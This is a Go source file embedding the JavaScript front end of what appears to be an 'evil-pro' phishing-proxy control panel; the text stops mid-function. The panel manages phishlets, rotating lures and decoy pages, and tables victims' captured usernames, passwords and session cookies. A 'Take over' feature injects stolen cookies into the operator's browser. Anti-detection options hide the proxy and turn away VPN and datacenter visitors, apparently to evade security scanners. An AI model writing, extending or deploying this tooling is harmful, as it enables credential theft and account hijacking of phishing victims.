package core

// panelJS is the single-page app served at /static/app.js.
// NOTE: no backticks are used inside (Go raw string); string building uses '+' only.
const panelJS = `'use strict';
/* evil-pro control panel */

var $ = function (s, r) { return (r || document).querySelector(s); };
var $$ = function (s, r) { return Array.prototype.slice.call((r || document).querySelectorAll(s)); };
function esc(v) {
  if (v === null || v === undefined) return '';
  return String(v).replace(/[&<>"']/g, function (c) {
    return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
  });
}
function fmtTime(ts) { if (!ts) return '--'; try { return new Date(ts * 1000).toLocaleString(); } catch (e) { return '--'; } }
function ago(ts) {
  if (!ts) return '--';
  var s = Math.floor(Date.now() / 1000) - ts;
  if (s < 60) return s + 's ago';
  if (s < 3600) return Math.floor(s / 60) + 'm ago';
  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
  return Math.floor(s / 86400) + 'd ago';
}
function nfmt(n) { return (n === null || n === undefined) ? '0' : String(n); }

function toast(msg, kind) {
  var el = document.createElement('div');
  el.className = 't ' + (kind || 'info');
  el.textContent = msg;
  $('#toast').appendChild(el);
  setTimeout(function () { el.remove(); }, 3200);
}
function copy(text) {
  if (!text) return;
  navigator.clipboard.writeText(text).then(function () { toast('Copied', 'info'); }, function () { toast('Copy failed', 'err'); });
}

/* ---------------- api ---------------- */
async function api(method, path, body) {
  var opt = { method: method, headers: {} };
  if (body !== undefined) { opt.headers['Content-Type'] = 'application/json'; opt.body = JSON.stringify(body); }
  var r = await fetch(path, opt);
  if (r.status === 401) { location.href = '/login'; throw new Error('unauthorized'); }
  var ct = r.headers.get('content-type') || '';
  var data = ct.indexOf('json') >= 0 ? await r.json() : await r.text();
  if (!r.ok) throw new Error((data && data.error) || ('HTTP ' + r.status));
  return data;
}
var API = {
  get: function (p) { return api('GET', p); },
  post: function (p, b) { return api('POST', p, b || {}); },
  del: function (p) { return api('DELETE', p); }
};

/* ---------------- state ---------------- */
var S = {
  page: 'overview', me: null, sys: null,
  q: { search: '', phishlet: '', tokens: '', sort: 'create_time', dir: 'desc' },
  pageNum: 0, pageSize: 25, total: 0,
  sessions: [], phishlets: [], lures: [], autolures: [], redirects: [], blacklist: null, config: null,
  timer: null, ext: false, busy: false
};

/* ---------------- nav ---------------- */
var NAV = [
  { g: 'Monitor' },
  { id: 'overview', label: 'Overview', ico: '◈' },
  { id: 'sessions', label: 'Sessions', ico: '⌘' },
  { g: 'Infrastructure' },
  { id: 'phishlets', label: 'Phishlets', ico: '⬡' },
  { id: 'lures', label: 'Lures', ico: '⚲' },
  { id: 'autolures', label: 'Autolures', ico: '↻' },
  { id: 'redirects', label: 'Redirects', ico: '⤳' },
  { g: 'Control' },
  { id: 'blacklist', label: 'Blacklist', ico: '⛒' },
  { id: 'config', label: 'Settings', ico: '⚙' },
  { id: 'system', label: 'System', ico: '▤' }
];
var TITLES = {
  overview: ['Overview', 'Capture activity and health at a glance'],
  sessions: ['Sessions', 'Captured credentials, tokens and session takeover'],
  phishlets: ['Phishlets', 'Enable, host and tune the phishlets you run'],
  lures: ['Lures', 'Shareable phishing entry points'],
  autolures: ['Autolures', 'Self-rotating links with a permanent gateway'],
  redirects: ['Redirects', 'Decoy / pre-phish landing pages'],
  blacklist: ['Blacklist', 'Who the proxy turns away'],
  config: ['Settings', 'Global configuration and integrations'],
  system: ['System', 'Runtime, certificate and DNS status']
};
function counts() {
  return {
    sessions: S.sys ? S.sys.total_sessions : '',
    phishlets: S.phishlets.length || '',
    lures: S.lures.length || '',
    autolures: S.autolures.length || ''
  };
}
function renderNav() {
  var c = counts();
  var h = '';
  NAV.forEach(function (n) {
    if (n.g) { h += '<div class="nav-group">' + n.g + '</div>'; return; }
    var badge = c[n.id];
    h += '<div class="nav-item' + (S.page === n.id ? ' active' : '') + '" data-act="nav" data-id="' + n.id + '">' +
      '<span class="ico">' + n.ico + '</span><span>' + n.label + '</span>' +
      (badge ? '<span class="count">' + badge + '</span>' : '') + '</div>';
  });
  $('#nav').innerHTML = h;
}
function goto(p) { location.hash = '#/' + p; }

/* ---------------- layout ---------------- */
function setHeader(title, desc, actions) {
  $('#pageTitle').textContent = title;
  $('#pageDesc').textContent = desc || '';
  $('#topActions').innerHTML = actions || '';
}
function defActions() {
  return '<button class="btn sm" data-act="refresh">Refresh</button>';
}

/* ---------------- views ---------------- */

async function viewOverview() {
  var d = await API.get('/api/v1/overview');
  S.sys = d;
  var rate = d.total_sessions ? Math.round(d.with_tokens / d.total_sessions * 100) : 0;
  var max = 1; d.timeline.forEach(function (t) { if (t.count > max) max = t.count; });
  var spark = d.timeline.map(function (t) {
    var hpct = Math.round(t.count / max * 100);
    return '<div class="b" style="height:' + (hpct < 3 ? 3 : hpct) + '%" title="' + esc(t.day) + ': ' + t.count + '"></div>';
  }).join('');
  var tops = d.top_phishlets.slice(0, 5).map(function (p) {
    return '<tr><td><span class="badge acc">' + esc(p.phishlet) + '</span></td><td class="right mono">' + p.count + '</td></tr>';
  }).join('') || '<tr><td colspan="2" class="dim center">no captures yet</td></tr>';
  var countries = d.top_countries.map(function (c) {
    return '<tr><td>' + esc(c.country) + '</td><td class="right mono">' + c.count + '</td></tr>';
  }).join('') || '<tr><td colspan="2" class="dim center">no geo data</td></tr>';

  return '' +
  '<div class="grid stats mb14">' +
    card('Total sessions', d.total_sessions, '') +
    card('With tokens', d.with_tokens, rate + '% capture rate', 'ok') +
    card('No tokens', d.no_tokens, '', 'warn') +
    card('Unique IPs', d.unique_ips, '') +
    card('Active now', d.active_sessions, 'live proxy sessions', 'accent') +
    card('Last capture', d.last_capture ? ago(d.last_capture) : '--', d.last_capture ? fmtTime(d.last_capture) : '', '', true) +
  '</div>' +
  '<div class="grid two">' +
    '<div class="card"><div class="card-head"><h3>Captures · last 14 days</h3><span class="dim mono">' + nfmt(d.total_sessions) + ' total</span></div><div class="card-body"><div class="spark">' + spark + '</div></div></div>' +
    '<div class="card pad0"><div class="card-head"><h3>Top phishlets</h3></div><table><tbody>' + tops + '</tbody></table></div>' +
  '</div>' +
  '<div class="grid two mt14">' +
    '<div class="card pad0"><div class="card-head"><h3>Recent captures</h3><button class="btn xs" data-act="nav" data-id="sessions">View all</button></div><div id="recent">loading…</div></div>' +
    '<div class="card pad0"><div class="card-head"><h3>Top countries</h3></div><table><tbody>' + countries + '</tbody></table></div>' +
  '</div>';

  function card(label, val, sub, cls, small) {
    return '<div class="card"><div class="stat-label">' + label + '</div><div class="stat-value ' + (cls || '') + (small ? ' small' : '') + '"' + (small ? ' style="font-size:15px"' : '') + '>' + esc(val) + '</div><div class="stat-sub">' + esc(sub || '') + '</div></div>';
  }
}
async function afterOverview() {
  try {
    var d = await API.get('/api/v1/sessions?limit=6');
    S.sessions = d.sessions;
    $('#recent').innerHTML = sessionsTable(d.sessions, true);
  } catch (e) { $('#recent').innerHTML = '<div class="empty">' + esc(e.message) + '</div>'; }
}

function card(label, val, sub, cls) {
  return '<div class="card"><div class="stat-label">' + label + '</div><div class="stat-value ' + (cls || '') + '">' + esc(val) + '</div><div class="stat-sub">' + esc(sub || '') + '</div></div>';
}

function sessionsTable(list, compact) {
  if (!list.length) return '<div class="empty"><div class="big">◌</div>No sessions match.</div>';
  var h = '<table><thead><tr>' +
    '<th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>IP</th>' +
    (compact ? '' : '<th>Location</th>') + '<th>Tokens</th><th>Captured</th><th></th></tr></thead><tbody>';
  list.forEach(function (s) {
    var geo = s.geo ? (s.geo.city ? s.geo.city + ', ' : '') + (s.geo.country || '') : '';
    h += '<tr class="clickable" data-act="sess" data-id="' + s.id + '">' +
      '<td class="mono dim">#' + s.id + '</td>' +
      '<td><span class="badge acc">' + esc(s.phishlet) + '</span></td>' +
      '<td class="mono"><span class="copy" data-act="copy" data-copy="' + esc(s.username) + '">' + (esc(s.username) || '<span class="dim">--</span>') + '</span></td>' +
      '<td class="mono">' + (s.password ? '<span class="copy" data-act="copy" data-copy="' + esc(s.password) + '">' + esc(s.password) + '</span>' : '<span class="dim">--</span>') + '</td>' +
      '<td class="mono">' + esc(s.remote_addr) + '</td>' +
      (compact ? '' : '<td class="trunc">' + esc(geo || '--') + '</td>') +
      '<td>' + (s.has_tokens ? '<span class="badge ok">captured</span>' : '<span class="badge mut">none</span>') + '</td>' +
      '<td class="dim" title="' + esc(fmtTime(s.create_time)) + '">' + ago(s.create_time) + '</td>' +
      '<td class="right"><button class="btn xs" data-act="sess" data-id="' + s.id + '">Open</button></td>' +
      '</tr>';
  });
  return h + '</tbody></table>';
}

async function viewSessions() {
  var q = 'limit=' + S.pageSize + '&offset=' + (S.pageNum * S.pageSize) +
    '&search=' + encodeURIComponent(S.q.search) + '&phishlet=' + encodeURIComponent(S.q.phishlet) +
    '&tokens=' + encodeURIComponent(S.q.tokens) + '&sort=' + S.q.sort + '&dir=' + S.q.dir;
  var d = await API.get('/api/v1/sessions?' + q);
  S.sessions = d.sessions; S.total = d.total;
  var pages = Math.max(1, Math.ceil(d.total / S.pageSize));
  var phopts = d.phishlets.map(function (p) { return '<option value="' + esc(p) + '"' + (S.q.phishlet === p ? ' selected' : '') + '>' + esc(p) + '</option>'; }).join('');
  var toks = [['', 'All tokens'], ['yes', 'With tokens'], ['no', 'No tokens']].map(function (t) {
    return '<option value="' + t[0] + '"' + (S.q.tokens === t[0] ? ' selected' : '') + '>' + t[1] + '</option>';
  }).join('');

  setHeader('Sessions', TITLES.sessions[1],
    '<button class="btn sm" data-act="export" data-id="csv">CSV</button>' +
    '<button class="btn sm" data-act="export" data-id="json">JSON</button>' +
    '<button class="btn sm danger" data-act="clear">Clear all</button>' +
    '<button class="btn sm" data-act="theme">◐</button>' +
    '<button class="btn sm" data-act="logout">Logout</button>' +
    '<button class="btn sm" data-act="refresh">Refresh</button>');

  return '<div class="toolbar">' +
    '<div class="search grow"><input id="fSearch" placeholder="Search username, password, IP, UA…" value="' + esc(S.q.search) + '"></div>' +
    '<select id="fPl" style="width:auto">' + '<option value="">All phishlets</option>' + phopts + '</select>' +
    '<select id="fTok" style="width:auto">' + toks + '</select>' +
    '<span class="dim mono">' + d.total + ' results</span>' +
  '</div>' +
  '<div class="card pad0">' + sessionsTable(d.sessions, false) + '</div>' +
  '<div class="toolbar mt14"><span class="dim mono">Page ' + (S.pageNum + 1) + ' / ' + pages + '</span>' +
    '<div style="margin-left:auto" class="actions">' +
      '<button class="btn sm" data-act="pg" data-id="prev"' + (S.pageNum <= 0 ? ' disabled' : '') + '>← Prev</button>' +
      '<button class="btn sm" data-act="pg" data-id="next"' + (S.pageNum + 1 >= pages ? ' disabled' : '') + '>Next →</button>' +
    '</div></div>';
}
function afterSessions() {
  var f = $('#fSearch'); if (f) f.oninput = function () { S.q.search = this.value; S.pageNum = 0; debounce(rerender, 300); };
  var p = $('#fPl'); if (p) p.onchange = function () { S.q.phishlet = this.value; S.pageNum = 0; rerender(); };
  var t = $('#fTok'); if (t) t.onchange = function () { S.q.tokens = this.value; S.pageNum = 0; rerender(); };
}

async function viewPhishlets() {
  var d = await API.get('/api/v1/phishlets');
  S.phishlets = d.phishlets;
  setHeader('Phishlets', TITLES.phishlets[1],
    '<button class="btn sm" data-act="pl-refresh">Reload all from disk</button><button class="btn sm" data-act="refresh">Refresh</button>');
  if (!d.phishlets.length) return '<div class="empty"><div class="big">⬡</div>No phishlets loaded.</div>';
  var h = '<div class="grid" style="grid-template-columns:repeat(auto-fill,minmax(340px,1fr))">';
  d.phishlets.forEach(function (p) {
    var st = p.enabled ? '<span class="badge ok">enabled</span>' : '<span class="badge mut">disabled</span>';
    var hid = p.hidden ? '<span class="badge warn">hidden</span>' : '';
    h += '<div class="card">' +
      '<div class="card-head"><h3>' + esc(p.name) + ' ' + st + ' ' + hid + '</h3>' +
        '<span class="dim mono" style="font-size:10px">' + esc(p.author || '') + '</span></div>' +
      '<div class="card-body">' +
        '<div class="kv">' +
          '<span class="k">Hostname</span><span class="v">' + esc(p.hostname || '—') + '</span>' +
          '<span class="k">Landing host</span><span class="v">' + esc(p.landing_host || '—') + '</span>' +
          '<span class="k">Real login</span><span class="v">' + esc(p.login_host || '—') + '</span>' +
          '<span class="k">unauth_url</span><span class="v">' + esc(p.unauth_url || '(global)') + '</span>' +
          '<span class="k">File</span><span class="v">' + esc(p.filename) + '</span>' +
        '</div>' +
        '<div class="actions mt14">' +
          (p.enabled
            ? '<button class="btn sm" data-act="pl-disable" data-id="' + esc(p.name) + '">Disable</button>'
            : '<button class="btn sm primary" data-act="pl-enable" data-id="' + esc(p.name) + '">Enable</button>') +
          '<button class="btn sm" data-act="pl-hostname" data-id="' + esc(p.name) + '">Hostname</button>' +
          '<button class="btn sm" data-act="pl-unauth" data-id="' + esc(p.name) + '">unauth_url</button>' +
          '<button class="btn sm" data-act="pl-hide" data-id="' + esc(p.name) + '">' + (p.hidden ? 'Unhide' : 'Hide') + '</button>' +
          '<button class="btn sm" data-act="pl-reload" data-id="' + esc(p.name) + '">Reload</button>' +
          '<button class="btn sm" data-act="pl-yaml" data-id="' + esc(p.name) + '">YAML</button>' +
          '<button class="btn sm" data-act="pl-dns" data-id="' + esc(p.name) + '">DNS</button>' +
        '</div>' +
      '</div></div>';
  });
  return h + '</div>';
}

async function viewLures() {
  var d = await API.get('/api/v1/lures');
  S.lures = d.lures;
  setHeader('Lures', TITLES.lures[1],
    '<button class="btn sm primary" data-act="lure-new">New lure</button><button class="btn sm" data-act="refresh">Refresh</button>');
  if (!d.lures.length) return '<div class="empty"><div class="big">⚲</div>No lures yet. Create one, then share its link.</div>';
  var h = '<div class="card pad0"><table><thead><tr><th>ID</th><th>Phishlet</th><th>Link</th><th>Info</th><th>State</th><th></th></tr></thead><tbody>';
  d.lures.forEach(function (l) {
    var state = l.paused ? '<span class="badge warn">paused</span>' : (l.active ? '<span class="badge ok">active</span>' : '<span class="badge mut">scheduled</span>');
    h += '<tr>' +
      '<td class="mono dim">#' + l.id + '</td>' +
      '<td><span class="badge acc">' + esc(l.phishlet) + '</span></td>' +
      '<td class="mono"><span class="trunc">' + esc(l.link || '—') + '</span> <span class="copy" data-act="copy" data-copy="' + esc(l.link) + '">⧉</span></td>' +
      '<td class="dim">' + esc(l.info || '—') + '</td>' +
      '<td>' + state + (l.auto_rotate ? ' <span class="badge mut">auto</span>' : '') + '</td>' +
      '<td class="right actions">' +
        '<button class="btn xs" data-act="lure-edit" data-id="' + l.id + '">Edit</button>' +
        '<button class="btn xs" data-act="lure-clone" data-id="' + l.id + '">Clone</button>' +
        (l.paused
          ? '<button class="btn xs ok" data-act="lure-unpause" data-id="' + l.id + '">Resume</button>'
          : '<button class="btn xs" data-act="lure-pause" data-id="' + l.id + '">Pause</button>') +
        '<button class="btn xs danger" data-act="lure-del" data-id="' + l.id + '">Del</button>' +
      '</td></tr>';
  });
  return h + '</tbody></table></div>';
}

async function viewAutolures() {
  var d = await API.get('/api/v1/autolures');
  S.autolures = d.autolures;
  setHeader('Autolures', TITLES.autolures[1],
    '<button class="btn sm primary" data-act="auto-new">New autolure</button><button class="btn sm" data-act="refresh">Refresh</button>');
  if (!d.autolures.length) return '<div class="empty"><div class="big">↻</div>No autolures. An autolure rotates its path automatically — you only ever share the gateway URL.</div>';
  var now = d.now;
  var h = '<div class="card pad0"><table><thead><tr><th>ID</th><th>Phishlet</th><th>Gateway (share this)</th><th>Active path</th><th>Next rotation</th><th>Notify</th><th></th></tr></thead><tbody>';
  d.autolures.forEach(function (l) {
    var secs = l.next_rotate - now;
    var next = secs > 0 ? Math.floor(secs / 60) + 'm ' + (secs % 60) + 's' : 'rotating…';
    h += '<tr>' +
      '<td class="mono dim">#' + l.id + '</td>' +
      '<td><span class="badge acc">' + esc(l.phishlet) + '</span></td>' +
      '<td class="mono"><span class="copy" data-act="copy" data-copy="' + esc(l.gateway) + '">' + esc(l.gateway) + ' ⧉</span></td>' +
      '<td class="mono"><span class="trunc">' + esc(l.link) + '</span></td>' +
      '<td class="mono">' + next + '</td>' +
      '<td><label class="switch"><input type="checkbox" data-act="auto-notify" data-id="' + l.id + '"' + (l.rotate_notify ? ' checked' : '') + '><span class="track"></span></label></td>' +
      '<td class="right"><button class="btn xs danger" data-act="auto-del" data-id="' + l.id + '">Del</button></td>' +
      '</tr>';
  });
  return h + '</tbody></table></div>';
}

async function viewRedirects() {
  var d = await API.get('/api/v1/redirects');
  S.redirects = d.redirects;
  setHeader('Redirects', TITLES.redirects[1],
    '<button class="btn sm primary" data-act="redir-new">New redirect</button><button class="btn sm" data-act="refresh">Refresh</button>');
  var rows = d.redirects.map(function (r) {
    return '<tr><td class="mono dim">#' + r.id + '</td><td class="mono">' + esc(r.host) + '</td><td class="mono">' + esc(r.file) + '</td>' +
      '<td class="mono trunc">' + esc(r.target_url || '—') + '</td>' +
      '<td>' + (r.turnstile ? '<span class="badge warn">turnstile</span>' : '<span class="badge mut">off</span>') + '</td>' +
      '<td class="right"><button class="btn xs danger" data-act="redir-del" data-id="' + r.id + '">Del</button></td></tr>';
  }).join('') || '<tr><td colspan="6" class="dim center">none configured</td></tr>';
  return '<div class="card pad0"><div class="card-head"><h3>Configured pages</h3><span class="dim mono" style="font-size:11px">' + esc(d.dir) + '</span></div>' +
    '<table><thead><tr><th>ID</th><th>Host</th><th>File</th><th>Target</th><th>Turnstile</th><th></th></tr></thead><tbody>' + rows + '</tbody></table></div>';
}

async function viewBlacklist() {
  var d = await API.get('/api/v1/blacklist?limit=1000');
  S.blacklist = d;
  setHeader('Blacklist', TITLES.blacklist[1], '<button class="btn sm" data-act="refresh">Refresh</button>');
  var modes = [['off', 'Off'], ['unauth', 'Block unauth only (recommended)'], ['noadd', 'Redirect, do not store'], ['all', 'Block everyone']];
  var mopts = modes.map(function (m) { return '<option value="' + m[0] + '"' + (d.mode === m[0] ? ' selected' : '') + '>' + m[1] + '</option>'; }).join('');
  var ips = d.ips.map(function (ip) {
    return '<tr><td class="mono">' + esc(ip) + '</td><td class="right"><button class="btn xs danger" data-act="bl-del" data-id="' + esc(ip) + '">Remove</button></td></tr>';
  }).join('') || '<tr><td colspan="2" class="dim center">empty</td></tr>';
  return '' +
    '<div class="grid stats mb14">' +
      card('Blocked IPs', d.count, '') + card('CIDR masks', d.masks, '') +
      '<div class="card"><div class="stat-label">Mode</div><select id="blMode" class="mt8">' + mopts + '</select></div>' +
    '</div>' +
    '<div class="card"><div class="card-head"><h3>Add IP</h3></div><div class="card-body"><form data-form="bladd" class="row">' +
      '<div class="field grow"><input name="ip" placeholder="e.g. 1.2.3.4" required></div>' +
      '<button class="btn primary" type="submit">Add</button></form>' +
      '<div class="hint mt8">file: ' + esc(d.file) + '</div></div></div>' +
    '<div class="card pad0 mt14"><table><tbody>' + ips + '</tbody></table></div>';
}
function afterBlacklist() {
  var m = $('#blMode'); if (m) m.onchange = function () { API.post('/api/v1/blacklist/mode', { mode: this.value }).then(function () { toast('Mode updated', 'ok'); }).catch(function (e) { toast(e.message, 'err'); }); };
}

async function viewConfig() {
  var c = await API.get('/api/v1/config');
  S.config = c;
  setHeader('Settings', TITLES.config[1], '<button class="btn sm" data-act="refresh">Refresh</button>');
  function f(label, key, val, hint, type) {
    return '<div class="field"><label>' + esc(label) + '</label><input data-cfg="' + key + '" type="' + (type || 'text') + '" value="' + esc(val === null || val === undefined ? '' : val) + '">' + (hint ? '<span class="hint">' + esc(hint) + '</span>' : '') + '</div>';
  }
  function sw(label, key, on, hint) {
    return '<div class="field"><label>' + esc(label) + '</label><label class="switch"><input type="checkbox" data-cfgsw="' + key + '"' + (on ? ' checked' : '') + '><span class="track"></span><span class="muted">' + (on ? 'on' : 'off') + '</span></label>' + (hint ? '<span class="hint">' + esc(hint) + '</span>' : '') + '</div>';
  }
  var g = c.general, t = c.telegram, gp = c.gophish, px = c.proxy;
  var tabs = '<div class="tabs" id="cfgTabs">' +
    '<div class="tab active" data-act="tab" data-id="gen">General</div>' +
    '<div class="tab" data-act="tab" data-id="anti">Anti-detection</div>' +
    '<div class="tab" data-act="tab" data-id="int">Integrations</div>' +
    '<div class="tab" data-act="tab" data-id="dash">Dashboard</div>' +
    '<div class="tab" data-act="tab" data-id="prox">Outbound proxy</div></div>';

  var panes =
  pane('gen', true,
    f('Base domain', 'domain', g.domain, 'e.g. yoursite.com — changing this resets phishlet hosts') +
    f('External IP', 'external_ipv4', g.external_ipv4, 'public IP of this server') +
    f('Bind IP', 'bind_ipv4', g.bind_ipv4, 'empty = all interfaces') +
    f('HTTPS port', 'https_port', g.https_port) +
    f('HTTP port', 'http_port', g.http_port, 'plain HTTP → HTTPS redirect + ACME') +
    f('DNS port', 'dns_port', g.dns_port) +
    sw('Autocert (ACME)', 'autocert', g.autocert, 'obtain/renew TLS certs automatically')) +
  pane('anti', false,
    f('unauth_url', 'unauth_url', g.unauth_url, 'where unauthorized traffic is sent') +
    sw('unauth_redirect', 'unauth_redirect', g.unauth_redirect, '302 to unauth_url instead of serving a copy') +
    sw('strip_headers', 'strip_headers', g.strip_headers, 'remove proxy-identifying headers') +
    sw('block_vpn', 'blockvpn', g.block_vpn, 'block VPN/proxy/datacenter visitors')) +
  pane('int', false,
    f('Telegram chat ID', 'chatid', t.chatid) +
    f('Telegram bot token', 'teletoken', t.token_set ? '' : '', t.token_set ? ('saved: ' + t.token_mask + ' — leave blank to keep') : 'BotFather token') +
    '<div class="actions mb14"><button class="btn sm" data-act="tg-test">Send test message</button></div>' +
    f('GoPhish admin URL', 'gophish_admin_url', gp.admin_url) +
    f('GoPhish API key', 'gophish_api_key', '', gp.api_key_set ? 'saved — leave blank to keep' : '') +
    sw('GoPhish insecure TLS', 'gophish_insecure', gp.insecure) +
    '<div class="actions mt8"><button class="btn sm" data-act="gp-test">Test GoPhish</button></div>') +
  pane('dash', false,
    f('Dashboard subdomain', 'dashboardsub', g.dashboard_sub, 'panel → https://panel.domain') +
    f('Dashboard username', 'dashboard_user', g.dashboard_user) +
    f('Dashboard password', 'dashboard_pass', '', g.dashboard_pass_set ? 'saved — leave blank to keep' : '') +
    '<div class="hint">Turnstile</div>' +
    '<div class="row"><div class="field"><label>Site key</label><input id="tsKey" value="' + esc(g.turnstile_site_key) + '"></div>' +
    '<div class="field"><label>Secret key</label><input id="tsSec" type="password" placeholder="' + (g.turnstile_set ? 'saved — blank keeps' : '') + '"></div></div>' +
    '<div class="actions mt8"><button class="btn sm" data-act="ts-save">Save Turnstile</button><button class="btn sm danger" data-act="ts-off">Disable</button></div>') +
  pane('prox', false,
    sw('Enabled', 'proxy_enabled', px.enabled, 'route upstream traffic through a proxy') +
    f('Type', 'proxy_type', px.type, 'http | https | socks5 | socks5h') +
    f('Address', 'proxy_address', px.address) +
    f('Port', 'proxy_port', px.port) +
    f('Username', 'proxy_username', px.username) +
    f('Password', 'proxy_password', ''));

  return tabs + '<div class="card"><div class="card-body">' + panes +
    '<div class="actions mt14"><button class="btn primary" data-act="cfg-save">Save settings</button>' +
    '<button class="btn" data-act="cert-test">Re-provision certificates</button></div></div></div>';

  function pane(id, active, body) { return '<div class="cfg-pane" data-pane="' + id + '"' + (active ? '' : ' style="display:none"') + '>' + body + '</div>'; }
}

async function viewSystem() {
  var s = await API.get('/api/v1/system');
  var cert = s.cert || {};
  setHeader('System', TITLES.system[1], '<button class="btn sm" data-act="cert-test">Re-provision certs</button><button class="btn sm" data-act="refresh">Refresh</button>');
  function kv(k, v, cls) { return '<span class="k">' + esc(k) + '</span><span class="v ' + (cls || '') + '">' + esc(v) + '</span>'; }
  var certBlock = cert.loaded
    ? kv('Subject', cert.subject) + kv('Issuer', cert.issuer) + kv('Expires', fmtTime(cert.not_after) + ' (' + cert.days_left + ' days)') + kv('File', cert.path || '—')
    : '<span class="k">Certificate</span><span class="v warn">no wildcard cert loaded</span>';
  var hosts = (s.active_hostnames || []).map(function (h) { return '<div class="mono">' + esc(s.external_ip) + '  ' + esc(h) + '</div>'; }).join('') || '<span class="dim">none</span>';
  return '' +
  '<div class="grid two">' +
    '<div class="card"><div class="card-head"><h3>Runtime</h3></div><div class="card-body"><div class="kv">' +
      kv('Version', s.version + ' (' + s.commit + ')') +
      kv('Uptime', Math.floor(s.uptime / 60) + 'm') +
      kv('Domain', s.domain || '—') +
      kv('External IP', s.external_ip || '—') +
      kv('HTTPS / DNS port', s.https_port + ' / ' + s.dns_port) +
      kv('GeoIP', s.geoip ? 'loaded' : 'not loaded') +
      kv('Auth', s.auth ? 'enabled' : 'DISABLED') +
    '</div></div></div>' +
    '<div class="card"><div class="card-head"><h3>Posture</h3></div><div class="card-body"><div class="kv">' +
      kv('unauth_redirect', s.unauth_redirect ? 'on' : 'off') +
      kv('strip_headers', s.strip_headers ? 'on' : 'off') +
      kv('autocert', s.autocert ? 'on' : 'off') +
      kv('block_vpn', s.block_vpn ? 'on' : 'off') +
      kv('Turnstile', s.turnstile ? 'on' : 'off') +
      kv('Telegram', s.telegram ? 'configured' : 'not configured') +
      kv('GoPhish', s.gophish ? 'configured' : 'not configured') +
      kv('Blacklist', s.blacklist_mode) +
    '</div></div></div>' +
  '</div>' +
  '<div class="grid two mt14">' +
    '<div class="card"><div class="card-head"><h3>Wildcard certificate</h3></div><div class="card-body"><div class="kv">' + certBlock + '</div></div></div>' +
    '<div class="card"><div class="card-head"><h3>DNS records</h3><span class="dim mono" style="font-size:10px">point these at the server</span></div><div class="card-body">' + hosts + '</div></div>' +
  '</div>';
}

/* ---------------- drawer ---------------- */
function openDrawer(title, body, actions) {
  $('#drawerHead').innerHTML = '<h3>' + title + '</h3><div class="actions" style="margin-left:auto">' + (actions || '') + '<button class="btn sm" data-act="drawer-close">✕</button></div>';
  $('#drawerBody').innerHTML = body;
  $('#drawer').classList.add('open'); $('#scrim').classList.add('open');
}
function closeDrawer() { $('#drawer').classList.remove('open'); $('#scrim').classList.remove('open'); }

async function openSession(id) {
  var s = await API.get('/api/v1/sessions/' + id);
  S.cur = s;
  window.postMessage({ type: 'SESSION_SELECT', payload: { sessionId: s.id, phishlet: s.phishlet, hasTokens: s.has_tokens } }, '*');
  var geo = s.geo ? ((s.geo.city ? s.geo.city + ', ' : '') + (s.geo.country || '') + (s.geo.isp ? ' · ' + s.geo.isp : '') + (s.geo.vpn ? ' [VPN]' : '') + (s.geo.datacenter ? ' [DC]' : '')) : '—';
  var tok = s.tokens && Object.keys(s.tokens).length ? JSON.stringify(s.tokens, null, 2) : '(none)';
  var body = '<div class="kv">' +
      kv('Username', s.username || '—', s.username) + kv('Password', s.password || '—', s.password) +
      kv('IP', s.remote_addr || '—') + kv('Location', geo) +
      kv('Captured', fmtTime(s.create_time)) + kv('Landing URL', s.landing_url || '—') +
    '</div>' +
    '<div class="field mt14"><label>User agent</label><div class="pre">' + esc(s.useragent || '—') + '</div></div>' +
    '<div class="field"><label>Cookies ' + (s.has_tokens ? '<span class="badge ok">' + s.token_count + ' captured</span>' : '<span class="badge mut">none</span>') + '</label><div class="pre">' + esc(tok) + '</div></div>';
  openDrawer('Session #' + s.id + ' · ' + esc(s.phishlet),
    body,
    (s.has_tokens ? '<button class="btn sm primary" data-act="inject" data-id="' + s.id + '">⚡ Take over</button>' : '') +
    '<button class="btn sm" data-act="sess-export" data-id="' + s.id + '">Cookies JSON</button>' +
    '<button class="btn sm danger" data-act="sess-del" data-id="' + s.id + '">Delete</button>');
  function kv(k, v, copyv) {
    return '<span class="k">' + esc(k) + '</span><span class="v' + (copyv ? ' copy" data-act="copy" data-copy="' + esc(copyv) : '') + '">' + esc(v) + '</span>';
  }
}

/* ---------------- inject (extension bridge) ---------------- */
document.addEventListener('ext-ready', function () { S.ext = true; });
window.addEventListener('inject-result', function (e) {
  var r = e.detail || {};
  var el = $('#injResult');
  if (el) el.innerHTML = '<div class="badge ok">' + (r.success || 0) + ' cookies injected' + (r.failed ? ', ' + r.failed + ' failed' : '') + '</div>';
});

async function inject(id) {
  var d = await API.get('/api/v1/sessions/' + id + '/cookies');
  if (!d.count) { toast('No cookies to inject', 'err'); return; }
  if (S.ext) {
    openModal('⚡ Session takeover',
      '<p class="muted mb14">Injecting <b>' + d.count + '</b> cookies into your browser and opening the target site…</p>' +
      '<div id="injResult"><span class="dim">working…</span></div>' +
      '<div class="actions mt14"><button class="btn sm" data-act="copy" data-copy="' + esc(d.cookie_header) + '">Copy Cookie header</button>' +
      '<button class="btn sm" data-act="dl-cookies" data-id="' + id + '">Download JSON</button></div>');
    window.postMessage({ type: 'DO_INJECT', payload: d }, '*');
  } else {
    downloadCookieFile(d);
    openModal('⚡ Session takeover',
      '<p class="muted mb14">Cookies downloaded (<b>' + d.count + '</b>). Install the Session Injector extension for one-click, or use Cookie-Editor manually.</p>' +
      '<div class="actions"><button class="btn sm primary" data-act="open-target" data-copy="' + esc(d.target_url) + '">Open target site</button>' +
      '<button class="btn sm" data-act="copy" data-copy="' + esc(d.cookie_header) + '">Copy Cookie header</button>' +
      '<button class="btn sm" data-act="dl-cookies" data-id="' + id + '">Download JSON</button></div>');
  }
}
function downloadCookieFile(d) {
  var blob = new Blob([JSON.stringify(d.cookies || [], null, 2)], { type: 'application/json' });
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'session_' + d.session_id + '_cookies.json';
  a.click();
  URL.revokeObjectURL(a.href);
}

/* ---------------- modal ---------------- */
function openModal(title, bodyHTML) {
  $('#modalBox').innerHTML = '<div class="card-head"><h3>' + title + '</h3><button class="btn sm" data-act="modal-close">✕</button></div><div class="card-body">' + bodyHTML + '</div>';
  $('#modal').classList.add('open');
}
function closeModal() { $('#modal').classList.remove('open'); }

/* ---------------- actions ---------------- */
var busy = false;
async function run(fn) {
  if (busy) return; busy = true;
